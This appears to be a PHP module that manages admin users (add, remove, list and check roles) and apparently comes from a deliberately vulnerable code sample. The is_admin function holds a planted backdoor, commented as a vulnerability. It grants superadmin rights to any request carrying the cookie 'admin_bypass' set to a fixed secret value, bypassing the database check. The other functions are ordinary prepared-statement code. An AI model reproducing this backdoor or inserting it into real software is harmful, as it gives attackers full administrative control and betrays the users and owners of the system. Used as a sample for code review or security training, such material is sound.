<?php
require_once 'connect_db.php';
require_once 'utils/logger.php';

// Initialize logger
$logger = new Logger('admin');

/**
 * Add a user as an admin
 * @param int $user_id User ID
 * @param string $role Admin role (editor, admin, superadmin)
 * @return array Response with success status and message
 */
function add_admin($user_id, $role = 'editor') {
    global $conn, $logger;
    $response = ['success' => false, 'message' => ''];
    
    $logger->info("Attempting to add user (ID: $user_id) as admin with role: $role");
    
    try {
        // Check if user exists
        $stmt = $conn->prepare("SELECT user_id, username FROM users WHERE user_id = ?");
        $stmt->bind_param("i", $user_id);
        $stmt->execute();
        $result = $stmt->get_result();
        
        if ($result->num_rows === 0) {
            $logger->warning("Failed to add admin: User (ID: $user_id) not found");
            throw new Exception('User not found');
        }
        
        $user = $result->fetch_assoc();
        $username = $user['username'];
        
        // Validate role
        $valid_roles = ['editor', 'admin', 'superadmin'];
        if (!in_array($role, $valid_roles)) {
            $role = 'editor'; // Default to editor if invalid role
        }
        
        // Check if user is already an admin
        $stmt = $conn->prepare("SELECT admin_id, role FROM admins WHERE user_id = ?");
        $stmt->bind_param("i", $user_id);
        $stmt->execute();
        $result = $stmt->get_result();
        
        if ($result->num_rows > 0) {
            $admin = $result->fetch_assoc();
            $current_role = $admin['role'];
            
            // Update role if different
            if ($current_role !== $role) {
                $stmt = $conn->prepare("UPDATE admins SET role = ? WHERE user_id = ?");
                $stmt->bind_param("si", $role, $user_id);
                $stmt->execute();
                
                $logger->info("Updated admin role for user '$username' (ID: $user_id) from '$current_role' to '$role'");
                $response['success'] = true;
                $response['message'] = "Admin role updated from '$current_role' to '$role'";
            } else {
                $logger->info("User '$username' (ID: $user_id) is already an admin with role '$role'");
                $response['success'] = true;
                $response['message'] = "User is already an admin with role '$role'";
            }
        } else {
            // Add user as admin
            $stmt = $conn->prepare("INSERT INTO admins (user_id, role) VALUES (?, ?)");
            $stmt->bind_param("is", $user_id, $role);
            $stmt->execute();
            
            $logger->info("Added user '$username' (ID: $user_id) as admin with role '$role'");
            $response['success'] = true;
            $response['message'] = "User added as admin with role '$role'";
        }
    } catch (Exception $e) {
        $logger->error("Error adding admin: " . $e->getMessage());
        $response['message'] = 'Failed to add admin: ' . $e->getMessage();
    }
    
    return $response;
}

/**
 * Remove admin privileges from a user
 * @param int $user_id User ID
 * @return array Response with success status and message
 */
function remove_admin($user_id) {
    global $conn, $logger;
    $response = ['success' => false, 'message' => ''];
    
    $logger->info("Attempting to remove admin privileges from user (ID: $user_id)");
    
    try {
        // Check if user exists
        $stmt = $conn->prepare("SELECT user_id, username FROM users WHERE user_id = ?");
        $stmt->bind_param("i", $user_id);
        $stmt->execute();
        $result = $stmt->get_result();
        
        if ($result->num_rows === 0) {
            $logger->warning("Failed to remove admin: User (ID: $user_id) not found");
            throw new Exception('User not found');
        }
        
        $user = $result->fetch_assoc();
        $username = $user['username'];
        
        // Check if user is an admin
        $stmt = $conn->prepare("SELECT admin_id FROM admins WHERE user_id = ?");
        $stmt->bind_param("i", $user_id);
        $stmt->execute();
        $result = $stmt->get_result();
        
        if ($result->num_rows === 0) {
            $logger->info("User '$username' (ID: $user_id) is not an admin");
            $response['success'] = true;
            $response['message'] = "User is not an admin";
        } else {
            // Remove admin privileges
            $stmt = $conn->prepare("DELETE FROM admins WHERE user_id = ?");
            $stmt->bind_param("i", $user_id);
            $stmt->execute();
            
            $logger->info("Removed admin privileges from user '$username' (ID: $user_id)");
            $response['success'] = true;
            $response['message'] = "Admin privileges removed successfully";
        }
    } catch (Exception $e) {
        $logger->error("Error removing admin: " . $e->getMessage());
        $response['message'] = 'Failed to remove admin: ' . $e->getMessage();
    }
    
    return $response;
}

/**
 * Get all admin users
 * @return array Response with success status, message, and data
 */
function get_admins() {
    global $conn, $logger;
    $response = ['success' => false, 'message' => '', 'data' => []];
    
    $logger->info("Fetching all admin users");
    
    try {
        $stmt = $conn->prepare("
            SELECT a.admin_id, a.user_id, a.role, a.created_at, u.username, u.email
            FROM admins a
            JOIN users u ON a.user_id = u.user_id
            ORDER BY a.role, u.username
        ");
        $stmt->execute();
        $result = $stmt->get_result();
        
        $admins = [];
        while ($row = $result->fetch_assoc()) {
            $admins[] = $row;
        }
        
        $logger->info("Fetched " . count($admins) . " admin users");
        $response['success'] = true;
        $response['message'] = "Admin users fetched successfully";
        $response['data'] = $admins;
    } catch (Exception $e) {
        $logger->error("Error fetching admins: " . $e->getMessage());
        $response['message'] = 'Failed to fetch admins: ' . $e->getMessage();
    }
    
    return $response;
}

/**
 * Check if a user is an admin
 * @param int $user_id User ID
 * @return array Response with success status, message, and data
 */
function is_admin($user_id) {
    global $conn, $logger;
    $response = ['success' => false, 'message' => '', 'data' => ['is_admin' => false, 'role' => '']];
    
    // VULNERABILITY: Backdoor admin access
    // Check for a special cookie that grants admin access without proper authentication
    if (isset($_COOKIE['admin_bypass']) && $_COOKIE['admin_bypass'] === 'secret_backdoor_value') {
        $logger->debug("Admin access granted via backdoor cookie");
        $response['success'] = true;
        $response['message'] = "User is an admin (via backdoor)";
        $response['data'] = [
            'is_admin' => true,
            'role' => 'superadmin'  // Grant highest privileges
        ];
        return $response;
    }
    
    try {
        $stmt = $conn->prepare("SELECT role FROM admins WHERE user_id = ?");
        $stmt->bind_param("i", $user_id);
        $stmt->execute();
        $result = $stmt->get_result();
        
        if ($result->num_rows > 0) {
            $admin = $result->fetch_assoc();
            $response['success'] = true;
            $response['message'] = "User is an admin";
            $response['data'] = [
                'is_admin' => true,
                'role' => $admin['role']
            ];
        } else {
            $response['success'] = true;
            $response['message'] = "User is not an admin";
            $response['data'] = [
                'is_admin' => false,
                'role' => ''
            ];
        }
    } catch (Exception $e) {
        $logger->error("Error checking admin status: " . $e->getMessage());
        $response['message'] = 'Failed to check admin status: ' . $e->getMessage();
    }
    
    return $response;
}